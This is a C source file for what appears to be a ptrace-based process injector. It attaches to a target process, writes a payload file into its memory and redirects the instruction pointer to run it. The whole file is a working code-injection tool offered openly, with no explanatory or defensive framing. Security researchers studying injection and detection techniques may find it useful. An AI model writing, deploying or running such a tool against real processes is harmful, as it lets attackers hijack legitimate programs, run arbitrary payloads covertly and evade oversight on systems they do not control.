#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/user.h>

int main(int argc, char **argv) {

    size_t ret_val = 0;
    size_t pid;
    size_t address;
    char *path;
    size_t fd;
    unsigned char tmp[8];

    struct user_regs_struct regs;

    if (argc != 4) {
        dprintf(STDERR_FILENO, "Usage: ./process_injector <target_pid> <memory_addr> <payload>");
        ret_val = 1;
        goto out;
    }

    pid = atoi(argv[1]);
    address = strtol(argv[2], NULL, 0);
    path = argv[3];

    fd = open(path, O_RDONLY);
    if (fd == -1) {
        perror("Open: ");
        ret_val = 1;
        goto out;
    }

    // Attach to process
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    wait(NULL);

    // Write payload to process memory
    size_t i = 0;
    while (read(fd, tmp, 8)) 
    {
        ptrace(PTRACE_POKETEXT, pid, address + i, *(long *)tmp);
        i += 8;
    }

    // Change rip to point at payload start
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    regs.rip = address + 2;

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

fd_out:
    close(fd);
out:
    return ret_val;
}
